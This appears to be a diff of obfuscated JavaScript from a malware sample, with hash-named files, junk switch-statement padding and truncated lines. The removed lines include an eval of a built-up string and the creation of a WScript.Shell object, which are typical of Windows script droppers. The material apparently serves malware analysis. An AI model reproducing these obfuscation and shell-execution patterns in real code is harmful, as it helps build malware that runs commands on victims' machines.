@@ -1,5 +1,3 @@
-<empty>
-:program
 switch (afefexej()) {
 case null:
 	var exugevu = 1;
@@ -130,11 +128,7 @@ if (ewnukowgor) {
 				case true:
 					var avavnumewn = undefined;
 					if (typeof avavnumewn == "undefin...
-
 // File: 20170118_2fa06b6b85a20c7a7acb593cf3a12656.js
-<empty>
-:program
-window
 switch (afefexej()) {
 case null:
 	var exugevu = 1;
@@ -191,8 +185,6 @@ case 1:
 		var sdampebeb = ukqagesikr + enakorigz;
 		sdampebeb = 39 + sdampebeb;
 	}
-eval(qbutyjtyna + "95789")
-qbutyjtyna = eval(qbutyjtyna + "95789")
 niqvevle()
 switch (niqvevle()) {
 	case true:
@@ -269,8 +261,6 @@ switch (niqvevle()) {
 					var avavnumewn = undefined;
 					if (typeof avavnumewn == "undefined") {
 						if...
-var avzamol = uvgud.CreateObject('WScript.Shell')
-uvgud.CreateObject('WScript.Shell')
 xsypiqyg()
 xsypiqyg()
 rilheljo()
